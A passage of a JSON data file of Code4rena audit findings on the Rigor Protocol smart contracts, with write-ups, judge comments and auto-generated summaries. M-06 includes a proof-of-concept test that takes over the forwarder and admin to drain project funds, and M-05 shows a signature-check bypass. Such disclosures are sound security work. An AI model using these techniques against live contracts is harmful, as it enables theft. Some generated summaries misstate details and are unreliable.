      "content": "_Submitted by minhquanym, also found by berndartmueller, Chom, and scaraven_\n\n[Project.sol#L710](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L710)<br>\n\nIn `Project` contract, the `lendToProject()` function might not be available to be called if there are a lot of Task in `tasks[]` list of project. It means that the project cannot be funded by either builder or community owner.\n\nThis can happen because `lendToProject()` used `projectCost()` function. And the loop in `projectCost()` did not have a mechanism to stop, itâ€™s only based on the length `taskCount`, and may take all the gas limit. If the gas limit is reached, this transaction will fail or revert.\n\nSame issue with `toggleLendingNeeded()` function which also call `projectCost()` function.\n\n### Proof of Concept\n\nFunction `projectCost()` did not have a mechanism to stop, only based on the `taskCount`.\n\n```solidity\nfunction projectCost() public view override returns (uint256 _cost) {\n    // Local instance of taskCount. To save gas.\n    uint256 _length = taskCount;\n\n    // Iterate over all tasks to sum their cost\n    for (uint256 _taskID = 1; _taskID <= _length; _taskID++) {\n        _cost += tasks[_taskID].cost;\n    }\n}\n```\n\nThere is no limit for builder when [add task](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L248-L257).\n\nAnd function `lendToProject()` used `projectCost()` to [check the new total lent value](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L199-L202)\n\n```solidity\nrequire(\n    projectCost() >= uint256(_newTotalLent),\n    \"Project::value>required\"\n);\n```\n\n### Recommended Mitigation Steps\n\nConsider keeping value of `projectCost()` in a storage variable and update it when a task is added or updated accordingly.\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/336)**\n\n**[Jack the Pug (judge) decreased severity to Medium](https://github.com/code-423n4/2022-08-rigor-findings/issues/336)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Project` contract, which is part of a project on GitHub. The vulnerability is that the `lendToProject()` and `toggleLendingNeeded()` functions may not be available to be called if there are a lot of tasks in the `tasks[]` list of the project. This is because the `projectCost()` function does not have a mechanism to stop, and it may take all the gas limit. If the gas limit is reached, the transaction will fail or revert.\n\nThe proof of concept for this vulnerability is that the `projectCost()` function does not have a mechanism to stop, only based on the `taskCount`. Additionally, there is no limit for the builder when they add a task. The `lendToProject()` function then uses the `projectCost()` to check the new total lent value.\n\nThe recommended mitigation steps for this vulnerability are to consider keeping the value of `projectCost()` in a storage variable and updating it when a task is added or updated accordingly. This way, the gas limit will not be reached and the transaction will not fail or revert.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/336",
      "tags": [],
      "finders": [
        "Chom",
        "scaraven",
        "minhquanym",
        "berndartmueller"
      ]
    },
    {
      "id": "3113",
      "title": "[M-09] It should not submit a project with no total budget. Requires at least one task with cost > 0",
      "impact": "MEDIUM",
      "content": "_Submitted by cryptonue, also found by aez121, hansfriese, obront, rbserver, and saneryee_\n\n[Community.sol#L206-L282](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L206-L282)<br>\n\nWhen publishing a project, there is still possibility the project doesn't have any task or 0 budget.\n\n### Proof of Concept\n\nAccording to contest guideline, there is information that says:\n\n> *\"Note that you cannot submit a project with no total budget. Therefore it requires at least one task with a budget > 0.\"*\n\nMeanwhile, on `publishProject()` in Community.sol, there is no check of this condition.\n\n### Recommended Mitigation Steps\n\nAdd a new `require` which will check if the first task (which is at index 1), its cost is > 0.\n\n      // Local instance of variables. For saving gas.\n      IProject _projectInstance = IProject(_project);\n      ...\n\n      // Revert if project doesn't have one task with budget > 0\n      require(_projectInstance.tasks[1].cost > 0, \"First task > 0\");\n\n**[parv3213 (Rigor) acknowledged and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/348#issuecomment-1211894839):**\n > The docs here were deprecated. A project doesn't have to have any task published in a community. \n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/348#issuecomment-1229169263):**\n > This is a valid Medium based on the docs (even though it's deprecated now).\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Community.sol contract, which is part of the code-423n4/2022-08-rigor GitHub repository. The bug is related to the publishing of projects, and can result in projects being published without any tasks or a budget of 0. According to the contest guidelines, projects must have at least one task with a budget greater than 0. However, the code in Community.sol does not include any checks to ensure this condition is met.\n\nThe recommended mitigation step is to add a new `require` statement which checks if the first task (index 1) has a cost that is greater than 0. This would prevent any projects being published without any tasks or a budget of 0. The code for this requirement would look like this:\n\n```\n  // Local instance of variables. For saving gas.\n  IProject _projectInstance = IProject(_project);\n  ...\n\n  // Revert if project doesn't have one task with budget > 0\n  require(_projectInstance.tasks[1].cost > 0, \"First task > 0\");\n```\n\nThis bug should be addressed as soon as possible to ensure that projects are published with the correct budget and tasks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/348",
      "tags": [],
      "finders": [
        "rbserver",
        "saneryee",
        "aez121",
        "cryptonue",
        "hansfriese",
        "obront"
      ]
    },
    {
      "id": "3112",
      "title": "[M-08] Builders must pay more interest when the system is paused.",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese, also found by 0x52, 0xNazgul, and rbserver_\n\n[Community.sol#L455](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L455)<br>\n[Community.sol#L484](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L484)<br>\n[Community.sol#L509](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509)<br>\n\nBuilders can't repay when the system is paused so they must pay more interest for the paused period.\n\n### Proof of Concept\n\nBuilders can repay to lenders using 3 functions, [repayLender()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L455), [reduceDebt()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L484), and [escrow()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509).\n\nBut they all don't work when the system is paused and builders have no way to avoid it.\n\nFurthermore, the HomeFi admin is the main lender of builders and there is no assurance that the admin would pause the community for a while to get more interest.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nRecommend thinking of an approach to make 3 repay functions work for paused or modify the interest calculation formula not to add interest for the paused period.\n\n**[zgorizzo69 (Rigor) acknowledged](https://github.com/code-423n4/2022-08-rigor-findings/issues/248)**\n\n**[parv3213 (Rigor) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/248#issuecomment-1207339132):**\n > The pause period is to fix severe bugs, and we don't want extra logic to handle extra interest. Hopefully, during that downtime, no builders will need to make repayment right away.<br>\n> Also, moving forward, HomeFi admin will be a decentralized DAO. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Community.sol contract of the 2022-08-rigor repository. Builders in the system are unable to repay lenders when the system is paused, which can lead to them having to pay more interest for the paused period. There are three functions that can be used to repay lenders, repayLender(), reduceDebt(), and escrow(), but they all don't work when the system is paused. This leaves builders with no way to avoid the issue. Additionally, the HomeFi admin is the main lender of builders, so there is a risk that the admin could pause the community for a while to get more interest.\n\nThe Solidity Visual Developer of VSCode was used to identify this vulnerability. It is recommended that an approach is thought of to make the three repay functions work for paused systems, or alternatively, the interest calculation formula is modified so that interest is not added for the paused period.",
      "quality_score": 4.5,
      "rarity_score": 4.5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/248",
      "tags": [
        "Business Logic",
        "Pause"
      ],
      "finders": [
        "0x52",
        "hansfriese",
        "0xNazgul",
        "rbserver"
      ]
    },
    {
      "id": "3111",
      "title": "[M-07] `Project.raiseDispute()` doesn't use approvedHashes - meaning users who use contracts can't raise disputes",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xA5DF_\n\n[Project.sol#L493-L536](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493-L536)<br>\n\nIn case users are using a contract (like a multisig wallet) to interact with a project, they can't raise a dispute.\n\nThe sponsors have added the `approveHash()` function to support users who wish to use contracts as builder/GC/SC. However, the `Project.raiseDispute()` function doesn't check them, meaning if any of those users wish to raise a dispute they can't do it.\n\n### Proof of Concept\n\nI've modified [the following test](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/disputeTests.ts#L179-L215), trying to use an approved hash. The test failed.\n\n```typescript\n  it('Builder can raise addTasks() dispute', async () => {\n      let expected = 2;\n      const actionValues = [\n        [exampleHash],\n        [100000000000],\n        expected,\n        projectAddress,\n      ];\n      // build and raise dispute transaction\n      const [encodedData, signature] = await makeDispute(\n        projectAddress,\n        0,\n        1,\n        actionValues,\n        signers[0],\n        '0x4222',\n      );\n      const encodedMsgHash = ethers.utils.keccak256(encodedData);\n      await project.connect(signers[0]).approveHash(encodedMsgHash);\n      let tx = await project\n        .connect(signers[1])\n        .raiseDispute(encodedData, \"0x\");\n      // expect event\n      await expect(tx)\n        .to.emit(disputesContract, 'DisputeRaised')\n        .withArgs(1, '0x4222');\n      // expect dispute raise to store info\n      const _dispute = await disputesContract.disputes(1);\n      const decodedAction = abiCoder.decode(types.taskAdd, _dispute.actionData);\n      expect(_dispute.status).to.be.equal(1);\n      expect(_dispute.taskID).to.be.equal(0);\n      expect(decodedAction[0][0]).to.be.equal(exampleHash);\n      expect(decodedAction[1][0]).to.be.equal(100000000000);\n      expect(decodedAction[2]).to.be.equal(expected);\n      expect(decodedAction[3]).to.be.equal(projectAddress);\n      // expect unchanged number of tasks\n      let taskCount = await project.taskCount();\n      expect(taskCount).to.be.equal(expected);\n    });\n\n```\n\n### Recommended Mitigation Steps\n\nMake `raiseDispute()` to check for approvedHashes too.\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/340)**\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/340#issuecomment-1229196683):**\n > Very nice!\n\n\n\n***\n\n",
      "summary": "\nA vulnerability in the code of a project has been identified that prevents users from raising disputes when using a contract (like a multisig wallet) to interact with the project. The sponsors have added the `approveHash()` function to support users who wish to use contracts as builder/GC/SC, but the `Project.raiseDispute()` function does not check for these approved hashes, meaning users cannot raise a dispute. \n\nThe vulnerability was tested by modifying a test (found at the provided link) to try and use an approved hash, which failed. The recommended mitigation step is to make `raiseDispute()` check for approvedHashes too.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/340",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "3110",
      "title": "[M-06] Attacker can drain all the projects within minutes, if admin account has been exposed",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xA5DF, also found by Lambda and sseefried_\n\n[HomeFi.sol#L156-L169](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L156-L169)<br>\n[HomeFi.sol#L199-L208](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L199-L208)<br>\n\nIn case where the admin wallet has been hacked, the attacker can drain all funds out of the project within minutes. All the attacker needs is the admin to sign a single meta/normal tx.<br>\nEven though the likelihood of the admin wallet being hacked might be low, given that the impact is critical - I think this makes it at least a medium bug.\n\nExamples of cases where the attacker can gain access to admin wallet:\n\n*   The computer which the admins are using has been hacked\n    *   Even if a hardware wallet is used, the attacker can still replace the data sent to the wallet the next time the admin has to sign a tx (whether it's a meta or normal tx)\n*   The website/software where the meta tx data is generated has been hacked and attacker modifies the data for tx\n*   A malicious website tricks the admin into signing a meta tx to replace the admin or forwarder\n\nSince the forwarder has the power to do everything in the system , once an attacker manages to replace it with a malicious forwarder, he can do whatever he wants withing minutes:\n\n*   The forwarder can replace the admin\n*   The forwarder can drain all funds from all projects by changing the subcontractor and marking tasks as complete, or adding new tasks / changing task cost as needed.\n\nEven when signatures are required, you can bypass it by using the `approveHash` function.\n\n### Proof of Concept\n\nHere's a PoC for taking over and running the `Project.setComplete()` function (I haven't included a whole process of changing SC etc. since that would be too time consuming, but there shouldn't be a difference between functions, all can be impersonated once you control the forwarder).\n\nThe PoC was added to [projectTests.ts#L1109](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1109), and is based on the 'should be able to complete a task' test.\n\n```typescript\n\n\n  it('PoC forwarder overtake', async () => {\n    const attacker = signers[10];\n\n\n    // deploy the malicious forwarder\n    const maliciousForwarder = await deploy<MaliciousForwarder>('MaliciousForwarder');\n    const adminAddress = await homeFiContract.admin();\n    const adminSigner = getSignerByAddress(signers, adminAddress);\n    // attacker takes over\n    await homeFiContract.connect(adminSigner).setTrustedForwarder(maliciousForwarder.address);\n      \n    // attacker can now replace the admin, so that admin can't set the forwarder back\n    let { data } = await homeFiContract.populateTransaction.replaceAdmin(\n      attacker.address\n    );\n    let from = adminAddress;\n    let to = homeFiContract.address;\n    if (!data) {\n      throw Error('No data');\n    }\n    let tx = await executeMetaTX(from, to, data);\n\n    // assert that admin has been replaced by attacker\n    expect(await homeFiContract.admin()).to.be.eq(attacker.address);\n\n    // attacker can now execute setComplete() using the approveHash() method\n\n    const taskID = 1;\n    const _taskCost = 2 * taskCost;\n    const taskSC = signers[3];\n    let completeData = {\n      types: ['uint256', 'address'],\n      values: [taskID, project.address],\n    };\n    const [encodedData, hash] = await encodeDataAndHash(completeData);\n    await mockDAIContract.mock.transfer\n      .withArgs(taskSC.address, _taskCost)\n      .returns(true);\n    await mockDAIContract.mock.transfer\n      .withArgs(await homeFiContract.treasury(), _taskCost / 1e3)\n      .returns(true);\n\n    ({data} = await project.populateTransaction.approveHash(hash));\n    let contractor = await project.contractor();\n    let {subcontractor} = await project.getTask(taskID);\n    let builder = await project.builder();\n\n    await executeMetaTX(contractor, project.address, data as string);\n    await executeMetaTX(subcontractor, project.address, data as string);\n    await executeMetaTX(builder, project.address, data as string);\n    \n\n    tx = await project.setComplete(encodedData, \"0x\");\n    await tx.wait();\n\n    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);\n\n    const { state } = await project.getTask(taskID);\n    expect(state).to.equal(3);\n    const getAlerts = await project.getAlerts(taskID);\n    expect(getAlerts[0]).to.equal(true);\n    expect(getAlerts[1]).to.equal(true);\n    expect(getAlerts[2]).to.equal(true);\n    expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);\n    expect(await project.changeOrderedTask()).to.deep.equal([]);\n\n    async function executeMetaTX(from: string, to: string, data: string ) {\n      const gasLimit = await ethers.provider.estimateGas({\n        to,\n        from,\n        data,\n      });\n      const message = {\n        from,\n        to,\n        value: 0,\n        gas: gasLimit.toNumber(),\n        nonce: 0,\n        data,\n      };\n\n      // @ts-ignore\n      let tx = await maliciousForwarder.execute(message, \"0x\");\n      return tx;\n    }\n  });\n\n\n// ----------------------------------------------------- //\n// Added to ethersHelpers.ts file:\nexport function encodeDataAndHash(\n  data: any): string[] {\n  const encodedData = encodeData(data);\n  const encodedMsgHash = ethers.utils.keccak256(encodedData);\n  return [encodedData, encodedMsgHash];\n}\n```\n\n### Recommended Mitigation Steps\n\n*   Limit `approveHash` to contracts only - I understood from the sponsor that it is used for contracts to sign hashes. So limiting it to contracts only can help prevent stealing funds (from projects that are held by EOA) in case that the forwarder has been compromised (this is effective also in case there's some bug in the forwarder contract).\n    *   Alternately, you can also make it use `msg.sender` instead of `_msgSender()`, this will also have a similar effect (it will allow also EOA to use the function, but not via forwarder).\n        *   The advantage is that not only it wouldn't cost more than now, it'll even save gas.\n        *   Another advantage is that it will also protect projects held by contracts from being impersonated by a malicious forwarder\n\n*   Make the process of replacing the forwarder or the admin a 2 step process with a delay between the steps (except for disabling the forwarder, in case the forwarder was hacked). This will give the admin the option to take steps to stop the attack, or at least give the users time to withdraw their money.\n\n```solidity\n    /// @inheritdoc IHomeFi\n    function replaceAdmin(address _newAdmin)\n        external\n        override\n        onlyAdmin\n        nonZero(_newAdmin)\n        noChange(admin, _newAdmin)\n    {\n        // Replace admin\n        pendingAdmin = _newAdmin;\n\n        adminReplacementTime = block.timestamp + 1 days;\n        emit AdminReplaceProposed(_newAdmin);\n    }\n\n        /// @inheritdoc IHomeFi\n    function executeReplaceAdmin()\n        external\n        override\n        onlyAdmin\n\n    {\n        require(adminReplacementTime > 0 && block.timestamp > adminReplacementTime, \"HomeFi::adminReplacmantTime\");\n        // Replace admin\n        admin = pendingAdmin;\n\n        emit AdminReplaced(_newAdmin);\n    }\n    /// @inheritdoc IHomeFi\n    function setTrustedForwarder(address _newForwarder)\n        external\n        override\n        onlyAdmin\n        noChange(trustedForwarder, _newForwarder)\n    {\n        // allow disabling the forwarder immediately in case it has been hacked\n        if(_newForwarder == address(0)){\n            trustedForwarder = _newForwarder;\n        }\n        forwarderSetTime = block.timestamp + 3 days;\n        pendingTrustedForwarder = _newForwarder;\n    }\n\n    function executeSetTrustedForwarder(address _newForwarder)\n        external\n        override\n        onlyAdmin\n    {\n        require(forwarderSetTime > 0 &&  block.timestamp > forwarderSetTime, \"HomeFi::forwarderSetTime\");\n        trustedForwarder = pendingTrustedForwarder;\n    }\n\n```\n\n*   Consider removing the meta tx for `HomeFi` `onlyAdmin` modifier (i.e. usg `msg.sender` instead of `_msgSender()`), given that it's not going to be used that often it may be worth giving up the comfort for hardening security\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/264)**\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/264#issuecomment-1211394594):**\n > Dupe of @sseefried's [#165](https://github.com/code-423n4/2022-08-rigor-findings/issues/165) \n> \n> Edit: On a second look issue 165 focuses more on not giving the forwarder the ability to impersonate the admin, and less on the damage that can be done with the forwarder using normal functionality (i.e. impersonating regular users, being able to drain all funds from projects).<br>\n> Also the suggested mitigation is very different.<br>\n> I think this makes this a different issue, but leaving this to the judge to decide.\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/264#issuecomment-1229188594):**\n > Both this and 165 are good findings, I tend to merge 165 into this. The usage of EIP2771 is not very common, and I think you raised a noteworthy point that: a relayer's `_msgSender` is less trustworthy than the real `msg.sender`, the admin themself should not be trusted too much either.\n> \n> I also like your writing, short but comprehensive. Thanks for being part of the C4 community, @0xA5DF! \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the HomeFi project, which could allow an attacker to drain all funds from the project within minutes. The attacker would need access to the admin wallet, which could be achieved by hacking the computer or website used by the admin, or by tricking them into signing a malicious meta transaction. The attacker could then replace the admin or forwarder, allowing them to execute the `Project.setComplete()` function and drain all funds.\n\nThe recommended mitigation steps are to limit the `approveHash` function to contracts only, make the process of replacing the forwarder or the admin a two-step process with a delay between the steps, and consider removing the meta transaction for the `HomeFi` `onlyAdmin` modifier. This would help to protect the project from being hacked and the funds drained.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/264",
      "tags": [],
      "finders": [
        "Lambda  sseefried",
        "0xA5DF"
      ]
    },
    {
      "id": "3109",
      "title": "[M-05] Anyone can create disputes if `contractor` is not set",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by 0xA5DF, arcoun, rotcivegaf, and wastewa_\n\n[Project.sol#L498-L502](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502)<br>\n[SignatureDecoder.sol#L25](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25)<br>\n\nDisputes enable an actor to arbitrate & potentially enforce requested state changes. However, the current implementation does not properly implement authorization, thus anyone is able to create disputes and spam the system with invalid disputes.\n\n### Proof of Concept\n\nCalling the `Project.raiseDispute` function with an invalid `_signature`, for instance providing a `_signature` with a length of 66 will return `address(0)` as the recovered signer address.\n\n[Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502)\n\n```solidity\nfunction raiseDispute(bytes calldata _data, bytes calldata _signature)\n    external\n    override\n{\n    // Recover the signer from the signature\n    address signer = SignatureDecoder.recoverKey(\n        keccak256(_data),\n        _signature,\n        0\n    );\n\n    ...\n  }\n```\n\n[SignatureDecoder.sol#L25](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25)\n\n```solidity\nfunction recoverKey(\n  bytes32 messageHash,\n  bytes memory messageSignatures,\n  uint256 pos\n) internal pure returns (address) {\n  if (messageSignatures.length % 65 != 0) {\n      return (address(0));\n  }\n\n  ...\n}\n```\n\nIf `_task` is set to `0` and the project does not have a `contractor`, the `require` checks will pass and `IDisputes(disputes).raiseDispute(_data, _signature);` is called. The same applies if a specific `_task` is given and if the task has a `subcontractor`. Then the check will also pass.\n\n[Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L84-L122)\n\n```solidity\nfunction raiseDispute(bytes calldata _data, bytes calldata _signature)\n    external\n    override\n{\n    // Recover the signer from the signature\n    address signer = SignatureDecoder.recoverKey(\n        keccak256(_data),\n        _signature,\n        0\n    );\n\n    // Decode params from _data\n    (address _project, uint256 _task, , , ) = abi.decode(\n        _data,\n        (address, uint256, uint8, bytes, bytes)\n    );\n\n    // Revert if decoded project address does not match this contract. Indicating incorrect _data.\n    require(_project == address(this), \"Project::!projectAddress\");\n\n    if (_task == 0) {\n        // Revet if sender is not builder or contractor\n        require(\n            signer == builder || signer == contractor, // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass\n            \"Project::!(GC||Builder)\"\n        );\n    } else {\n        // Revet if sender is not builder, contractor or task's subcontractor\n        require(\n            signer == builder ||\n                signer == contractor || // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass\n                signer == tasks[_task].subcontractor,\n            \"Project::!(GC||Builder||SC)\"\n        );\n\n        if (signer == tasks[_task].subcontractor) {\n            // If sender is task's subcontractor, revert if invitation is not accepted.\n            require(getAlerts(_task)[2], \"Project::!SCConfirmed\");\n        }\n    }\n\n    // Make a call to Disputes contract raiseDisputes.\n    IDisputes(disputes).raiseDispute(_data, _signature); // @audit-info Dispute will be created. Anyone can spam the system with fake disputes\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider checking the recovered `signer` address in `Project.raiseDispute` to not equal the zero-address:\n\n```solidity\nfunction raiseDispute(bytes calldata _data, bytes calldata _signature)\n    external\n    override\n{\n    // Recover the signer from the signature\n    address signer = SignatureDecoder.recoverKey(\n        keccak256(_data),\n        _signature,\n        0\n    );\n\n    require(signer != address(0), \"Zero-address\"); // @audit-info Revert if signer is zero-address\n\n    ...\n  }\n```\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/327)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project that does not properly implement authorization. This means that anyone is able to create disputes and spam the system with invalid disputes. This is due to the fact that the code does not check that the recovered signer address is not the zero-address.\n\nThe vulnerable code is located in the `Project.raiseDispute` function, which is called with an invalid `_signature` and returns `address(0)` as the recovered signer address. In addition, the `SignatureDecoder.recoverKey` function does not check that the `messageSignatures` length is equal to 65.\n\nThe recommended mitigation steps are to check that the recovered `signer` address in `Project.raiseDispute` does not equal the zero-address. This can be done by adding a `require(signer != address(0), \"Zero-address\");` check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/327",
      "tags": [],
      "finders": [
        "arcoun",
        "rotcivegaf",
        "berndartmueller",
        "0xA5DF",
        "wastewa"
      ]
    },
    {
      "id": "3108",
      "title": "[M-04] Hash approval not possible when contractor == subcontractor",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda, also found by hansfriese_\n\n[Project.sol#L859](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L859)<br>\n\nWhen a contractor (let's say Bob) is also a subcontractor (which can be a valid scenario), it is not possible to use the hash approval feature for `checkSignatureTask`. The first call to `checkSignatureValidity` will already delete `approvedHashes[address(Bob)][_hash]`, the second call therefore fails.\n\nNote that the same situation would also be possible for builder == contractor, or builder == subcontractor, although those situations are probably less likely to occur.\n\n### Recommended Mitigation Steps\n\nDelete the approval only when all checks are done.\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/86)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Project.sol code on GitHub. This vulnerability can occur when a contractor (Bob) is also a subcontractor. In this case, it is not possible to use the hash approval feature for checkSignatureTask. The first call to checkSignatureValidity will delete approvedHashes[address(Bob)][_hash], which causes the second call to fail. This situation could also occur for builder == contractor, or builder == subcontractor, although those scenarios are less likely. The recommended mitigation step is to delete the approval only when all checks are done.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/86",
      "tags": [],
      "finders": [
        "Lambda",
        "hansfriese"
      ]
    },
    {
      "id": "3107",
      "title": "[M-03] Signature Checks could be passed when `SignatureDecoder.recoverKey()` returns 0",
      "impact": "MEDIUM",
      "content": "_Submitted by cryptphi, also found by 0x1f8b and defsec_\n\n[Project.sol#L887](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L887)<br>\n[Project.sol#L108-L115](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L108-L115)<br>\n\nIt is possible to pass Signature Validity check with an SignatureDecoder.recoverKey() returns 0 whenever the builder and /or contractor have an existing approved hash for a data.\n\nWith occurrence of above, any user can call changeOrder or setComplete functions successfully after  user approves data hashes.\n\n### Recommended Mitigation Steps\n\nThere should be a require check for `_recoveredSignature != 0` in `checkSignatureValidity()`.\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/179)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that can be exploited in the code-423n4/2022-08-rigor project. It is possible for a user to pass the signature validity check with a SignatureDecoder.recoverKey() that returns 0 when the builder and/or contractor have an existing approved hash for a data. This could allow any user to call the changeOrder or setComplete functions successfully after the user approves the data hashes. The vulnerability was discovered through manual review. The recommended mitigation step is to add a require check for `_recoveredSignature != 0` in the checkSignatureValidity() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/179",
      "tags": [],
      "finders": [
        "0x1f8b  defsec",
        "cryptphi"
      ]
    },
    {
      "id": "3106",
      "title": "[M-02] Missing upper limit definition in `replaceLenderFee()` of `HomeFi.sol`",
      "impact": "MEDIUM",
      "content": "_Submitted by MiloTruck, also found by &#95;&#95;141345&#95;&#95;, 0x52, 8olidity, cccz, Ch&#95;301, codexploder, cryptonue, hansfriese, Ruhum, and sseefried_\n\n[Community.sol#L392-L394](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L392-L394)<br>\n[HomeFi.sol#L184-L197](https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L184-L197)<br>\n\nThe admin of the `HomeFi` contract can set `lenderFee` to greater than 100%, forcing calls to `lendToProject()` to all projects created in the future to revert.\n\n### Proof of Concept\n\nUsing the function `replaceLenderFee()`, admins of the `HomeFi` contract can set `lenderFee` to any arbitrary `uint256` value:\n\n```solidity\n 185:        function replaceLenderFee(uint256 _newLenderFee)\n 186:            external\n 187:            override\n 188:            onlyAdmin\n 189:        {\n 190:            // Revert if no change in lender fee\n 191:            require(lenderFee != _newLenderFee, \"HomeFi::!Change\");\n 192:    \n 193:            // Reset variables\n 194:            lenderFee = _newLenderFee;\n 195:    \n 196:            emit 